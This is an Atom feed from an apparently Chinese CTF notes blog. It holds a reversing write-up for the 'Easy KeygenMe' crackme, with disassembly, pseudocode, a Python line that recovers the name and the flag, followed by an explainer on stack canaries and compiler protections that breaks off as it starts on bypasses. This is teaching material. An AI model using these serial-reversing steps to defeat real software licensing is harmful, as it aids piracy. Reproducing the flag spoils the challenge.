@@ -1,0 +1,1041 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://ctf.dontpanic.blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://ctf.dontpanic.blog/" rel="alternate" type="text/html" /><updated>2019-03-12T20:28:33+00:00</updated><id>https://ctf.dontpanic.blog/feed.xml</id><title type="html">dontpan1c 的 CTF 笔记</title><subtitle>南阳一出即相，淮阴一出即将。</subtitle><entry><title type="html">Easy KeygenMe</title><link href="https://ctf.dontpanic.blog/writeups/reversing-kr-easy-keygenme.html" rel="alternate" type="text/html" title="Easy KeygenMe" /><published>2019-03-12T00:00:00+00:00</published><updated>2019-03-12T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/writeups/reversing-kr-easy-keygenme</id><content type="html" xml:base="https://ctf.dontpanic.blog/writeups/reversing-kr-easy-keygenme.html">&lt;p&gt;题目要求 Find the Name when the Serial is 5B134977135E7D13：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/reversing-kr-easy-keygenme/output.jpg&quot; alt=&quot;output&quot; /&gt;&lt;/p&gt;
+&lt;div&gt;
+&lt;div id=&quot;writeup_show_button&quot; style=&quot;cursor: pointer&quot;&gt;
+    &lt;div class=&quot;alert alert-warning&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处显示 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;div id=&quot;writeup_hide_button&quot; style=&quot;cursor: pointer&quot; class=&quot;d-none&quot;&gt;
+    &lt;div class=&quot;alert alert-info&quot;&gt;
+        &lt;b&gt;&lt;i class=&quot;fas fa-exclamation-circle&quot;&gt;&lt;/i&gt; 点击此处隐藏 Writeup&lt;/b&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+(function()
+{
+    var parent = document.scripts[document.scripts.length - 1].parentNode;
+    parent.querySelector(&quot;#writeup_show_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.remove(&quot;d-none&quot;);
+    }
+    parent.querySelector(&quot;#writeup_hide_button&quot;).onclick = function ()
+    {
+        parent.querySelector(&quot;#writeup_hide_button&quot;).classList.add(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup_show_button&quot;).classList.remove(&quot;d-none&quot;);
+        parent.querySelector(&quot;#writeup&quot;).classList.add(&quot;d-none&quot;);
+    }
+})();
+&lt;/script&gt;
+&lt;div id=&quot;writeup&quot; class=&quot;d-none&quot; markdown=&quot;1&quot;&gt;
+&lt;p&gt;用 r2 载入看一下 “Input:” 的字符串的交叉引用，只有一个函数引用了。翻看一下，基本确定逻辑都在这个函数中。在输入了 &lt;code&gt;Name&lt;/code&gt; 之后，程序会做一些计算：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode asm&quot;&gt;&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-1&quot; title=&quot;1&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x0040105e      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;lea&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;edi&lt;/span&gt;, [local_18h] &lt;span class=&quot;co&quot;&gt;; 0x18 ; 24&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-2&quot; title=&quot;2&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x00401065      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-3&quot; title=&quot;3&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x00401067      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;add&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;8&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-4&quot; title=&quot;4&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x0040106a      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-5&quot; title=&quot;5&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x0040106c      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;esi&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;esi&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-6&quot; title=&quot;6&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x0040106e      &lt;/span&gt;repne &lt;span class=&quot;bu&quot;&gt;scasb&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;al&lt;/span&gt;, &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;es&lt;/span&gt;:[&lt;span class=&quot;kw&quot;&gt;edi&lt;/span&gt;]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-7&quot; title=&quot;7&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x00401070      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;not&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-8&quot; title=&quot;8&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x00401072      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;dec&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-9&quot; title=&quot;9&quot;&gt;|&lt;span class=&quot;bn&quot;&gt;           0x00401073      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;test&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-10&quot; title=&quot;10&quot;&gt;|       ,=&amp;lt;&lt;span class=&quot;bn&quot;&gt; 0x00401075      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;jle&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;  0x4010b6&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-11&quot; title=&quot;11&quot;&gt;|      .--&amp;gt;&lt;span class=&quot;bn&quot;&gt; 0x00401077      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;cmp&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;esi&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;; 3&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-12&quot; title=&quot;12&quot;&gt;|     ,===&amp;lt;&lt;span class=&quot;bn&quot;&gt; 0x0040107a      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;jl&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;   0x40107e&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-13&quot; title=&quot;13&quot;&gt;|     |:|&lt;span class=&quot;bn&quot;&gt;   0x0040107c      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;esi&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;esi&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-14&quot; title=&quot;14&quot;&gt;|     `---&amp;gt;&lt;span class=&quot;bn&quot;&gt; 0x0040107e      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;movsx&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;, &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt; [&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt; + &lt;span class=&quot;kw&quot;&gt;esi&lt;/span&gt; + &lt;span class=&quot;bn&quot;&gt;0xc&lt;/span&gt;] &lt;span class=&quot;co&quot;&gt;; [0xc:1]=255 ; 12&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-15&quot; title=&quot;15&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x00401083      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;movsx&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;edx&lt;/span&gt;, &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt; [&lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt; + &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt; + &lt;span class=&quot;bn&quot;&gt;0x10&lt;/span&gt;] &lt;span class=&quot;co&quot;&gt;; [0x10:1]=255 ; 16&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-16&quot; title=&quot;16&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x00401088      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;edx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-17&quot; title=&quot;17&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x0040108a      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;lea&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, [local_74h] &lt;span class=&quot;co&quot;&gt;; 0x74 ; &amp;#39;t&amp;#39; ; 116&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-18&quot; title=&quot;18&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x0040108e      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-19&quot; title=&quot;19&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x0040108f      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-20&quot; title=&quot;20&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x00401090      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;lea&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;, [local_7ch] &lt;span class=&quot;co&quot;&gt;; 0x7c ; &amp;#39;|&amp;#39; ; 124&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-21&quot; title=&quot;21&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x00401094      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;str&lt;/span&gt;.s_02X &lt;span class=&quot;co&quot;&gt;; 0x408054 ; &amp;quot;%s%02X&amp;quot;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-22&quot; title=&quot;22&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x00401099      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-23&quot; title=&quot;23&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x0040109a      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;call&lt;/span&gt; fcn&lt;span class=&quot;fl&quot;&gt;.00401150&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-24&quot; title=&quot;24&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x0040109f      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;add&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;, 0x10&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-25&quot; title=&quot;25&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010a2      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;inc&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-26&quot; title=&quot;26&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010a3      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;lea&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;edi&lt;/span&gt;, [local_10h] &lt;span class=&quot;co&quot;&gt;; 0x10 ; 16&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-27&quot; title=&quot;27&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010a7      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;or&lt;/span&gt;   &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0xffffffff&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-28&quot; title=&quot;28&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010aa      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;xor&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-29&quot; title=&quot;29&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010ac      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;inc&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;esi&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-30&quot; title=&quot;30&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010ad      &lt;/span&gt;repne &lt;span class=&quot;bu&quot;&gt;scasb&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;al&lt;/span&gt;, &lt;span class=&quot;dt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;es&lt;/span&gt;:[&lt;span class=&quot;kw&quot;&gt;edi&lt;/span&gt;]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-31&quot; title=&quot;31&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010af      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;not&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-32&quot; title=&quot;32&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010b1      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;dec&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-33&quot; title=&quot;33&quot;&gt;|      :|&lt;span class=&quot;bn&quot;&gt;   0x004010b2      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;cmp&lt;/span&gt;  &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;ecx&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb1-34&quot; title=&quot;34&quot;&gt;|      `==&amp;lt;&lt;span class=&quot;bn&quot;&gt; 0x004010b4      &lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;jl&lt;/span&gt;&lt;span class=&quot;bn&quot;&gt;   0x401077&lt;/span&gt;&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;需要注意的是由于这个函数是 &lt;code&gt;esp&lt;/code&gt; 寻址，有时 r2 给出的变量名是不对的。上面这段代码就是一段循环，写出伪代码如下：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode c&quot;&gt;&lt;code class=&quot;sourceCode c&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-1&quot; title=&quot;1&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-2&quot; title=&quot;2&quot;&gt;result = &lt;span class=&quot;st&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-3&quot; title=&quot;3&quot;&gt;esi = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-4&quot; title=&quot;4&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;cf&quot;&gt;while&lt;/span&gt;(input[i] != &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-6&quot; title=&quot;6&quot;&gt;{&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-7&quot; title=&quot;7&quot;&gt;    i++;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-8&quot; title=&quot;8&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-9&quot; title=&quot;9&quot;&gt;    &lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; (esi == &lt;span class=&quot;dv&quot;&gt;3&lt;/span&gt;)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-10&quot; title=&quot;10&quot;&gt;    {&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-11&quot; title=&quot;11&quot;&gt;        esi = &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-12&quot; title=&quot;12&quot;&gt;    }&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-13&quot; title=&quot;13&quot;&gt;    c = {&lt;span class=&quot;bn&quot;&gt;0x10&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x20&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x30&lt;/span&gt;}&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-14&quot; title=&quot;14&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-15&quot; title=&quot;15&quot;&gt;    ecx = c[esi]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-16&quot; title=&quot;16&quot;&gt;    edx = input[ebp]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-17&quot; title=&quot;17&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-18&quot; title=&quot;18&quot;&gt;    ecx = ecx ^ edx&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-19&quot; title=&quot;19&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-20&quot; title=&quot;20&quot;&gt;    sprintf(result, &lt;span class=&quot;st&quot;&gt;&amp;quot;%s02X&amp;quot;&lt;/span&gt;, result, ecx)&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-21&quot; title=&quot;21&quot;&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-22&quot; title=&quot;22&quot;&gt;    ebp++&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-23&quot; title=&quot;23&quot;&gt;    esi++&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb2-24&quot; title=&quot;24&quot;&gt;}&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;计算好之后，程序直接将 SerialNumber 与计算结果进行字符串比较，相等就认为正确。因此用 python 算一下：&lt;/p&gt;
+&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode python&quot;&gt;&lt;code class=&quot;sourceCode python&quot;&gt;&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-1&quot; title=&quot;1&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; operator &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; xor&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-2&quot; title=&quot;2&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; a &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;\x5B\x13\x49\x77\x13\x5E\x7D\x13&lt;/span&gt;&lt;span class=&quot;st&quot;&gt;&amp;quot;&lt;/span&gt;&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-3&quot; title=&quot;3&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; b &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; [&lt;span class=&quot;bn&quot;&gt;0x10&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x20&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x30&lt;/span&gt;]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-4&quot; title=&quot;4&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; c &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; [&lt;span class=&quot;bu&quot;&gt;chr&lt;/span&gt;(xor(b[i &lt;span class=&quot;op&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;3&lt;/span&gt;], &lt;span class=&quot;bu&quot;&gt;ord&lt;/span&gt;(a[i]))) &lt;span class=&quot;cf&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;kw&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;range&lt;/span&gt;(&lt;span class=&quot;bu&quot;&gt;len&lt;/span&gt;(a))]&lt;/a&gt;
+&lt;a class=&quot;sourceLine&quot; id=&quot;cb3-5&quot; title=&quot;5&quot;&gt;&lt;span class=&quot;op&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; c&lt;/a&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;就能够得到 flag 为 &lt;flag&gt;K3yg3nm3&lt;/flag&gt;&lt;/p&gt;
+&lt;/div&gt;
+&lt;/div&gt;</content><author><name></name></author><category term="reversing" /><summary type="html">题目要求 Find the Name when the Serial is 5B134977135E7D13：</summary></entry><entry><title type="html">栈缓冲区溢出之三 Security Cookie / Canary</title><link href="https://ctf.dontpanic.blog/notes/stack-buffer-overflow-canary.html" rel="alternate" type="text/html" title="栈缓冲区溢出之三 Security Cookie / Canary" /><published>2019-02-28T00:00:00+00:00</published><updated>2019-02-28T00:00:00+00:00</updated><id>https://ctf.dontpanic.blog/notes/stack-buffer-overflow-canary</id><content type="html" xml:base="https://ctf.dontpanic.blog/notes/stack-buffer-overflow-canary.html">&lt;p&gt;当栈溢出发生时，如果能够检测到栈溢出已经发生，就可以及时中止程序的执行，从而能够避免继续走攻击者安排好的路。Windows 上的 Security Cookie 就是这样一种机制。在 Linux 上，Canary 这个名字更常用。不论是 Security Cookie 还是 Canary，它们的原理都是相同的。&lt;/p&gt;
+&lt;p&gt;当栈溢出发生时，常见的获取控制流的手段就是覆盖函数的返回地址：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/stack-buffer-overflow-101/stack-buffer-overflow.png&quot; alt=&quot;stack-buffer-overflow&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;那么如何才能够检测到返回地址是否被覆盖了呢？从上图我们可以看到，如果需要覆盖返回地址，攻击者必须覆盖掉从缓冲区开始一直到返回地址之间的所有内容，包括其他的局部变量和 BP。Security Cookie 的思想是，在 BP 之上压入一个随机产生的数，如果缓冲区溢出后覆盖了返回地址，那么则一定会覆盖掉 Security Cookie：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/local/posts/stack-buffer-overflow-canary/canary.png&quot; alt=&quot;canary&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;与此同时，在栈空间之外，还保存有一份 Security Cookie。在函数返回之前，只需要检查栈上的 Cookie 跟全局的 Cookie 是否一致即可，如果不一致则说明已经发生了溢出。&lt;/p&gt;
+&lt;p&gt;不过，做这些额外的工作会对程序性能产生影响。因此，默认情况下 MSVC 和 GCC 不会对所有的函数栈帧进行保护，而是选择那些明显存在安全隐患的函数进行保护。&lt;/p&gt;
+&lt;h2 id=&quot;gcc-的--fstack-protector-编译选项&quot;&gt;GCC 的 &lt;code&gt;-fstack-protector&lt;/code&gt; 编译选项&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;-fstack-protector&lt;/code&gt; 选项并不会对所有的函数加以保护。它只会为：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;调用了 &lt;a href=&quot;https://linux.die.net/man/3/alloca&quot;&gt;&lt;code&gt;alloca&lt;/code&gt;&lt;/a&gt; 的函数&lt;/li&gt;
+&lt;li&gt;存在超过 8 个字节的缓冲区的函数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;添加栈溢出保护。与之类似的还有两个选项：&lt;code&gt;-fstack-protector-strong&lt;/code&gt; 和 &lt;code&gt;-fstack-protector-all&lt;/code&gt;。&lt;code&gt;-fstack-protector-strong&lt;/code&gt; 属于加强版本，它除了上面两类函数，它还会为：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;定义了局部数组的函数&lt;/li&gt;
+&lt;li&gt;持有局部栈地址的函数&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;添加保护。&lt;code&gt;-fstack-protector-all&lt;/code&gt; 一眼便知，它会为所有函数都添加栈溢出保护。&lt;/p&gt;
+&lt;p&gt;另外还有一个编译选项 &lt;code&gt;-fstack-protector-explicit&lt;/code&gt;，它则表示这项功能默认关闭，只对那些显式声明了 &lt;code&gt;stack_protect&lt;/code&gt; 属性的函数添加保护。&lt;/p&gt;
+&lt;h2 id=&quot;msvc-的-gs-编译选项&quot;&gt;MSVC 的 &lt;code&gt;/GS&lt;/code&gt; 编译选项&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;/GS&lt;/code&gt; 同样不会保护所有的函数，它只保护包含有“GS Buffer”的函数。所谓“GS Buffer”是指：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;大于 4 个字节的数组，并且数组的元素个数超过 2 个，同时元素的类型不是指针类型。或者，&lt;/li&gt;
+&lt;li&gt;大于 8 个字节的数据结构，其中没有指针类型。或者，&lt;/li&gt;
+&lt;li&gt;由 &lt;code&gt;_alloca&lt;/code&gt; 申请的缓冲区。或者，&lt;/li&gt;
+&lt;li&gt;任何包含 GS Buffer 的类或结构体。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;绕过-security-cookie&quot;&gt;绕过 Security Cookie&lt;/h2&gt;
+&lt;p&gt;Security Cookie 通常难以绕过。但在某些特殊情况下，还是有绕过的可能：&lt;/p&gt;
+&lt;ul&gt;
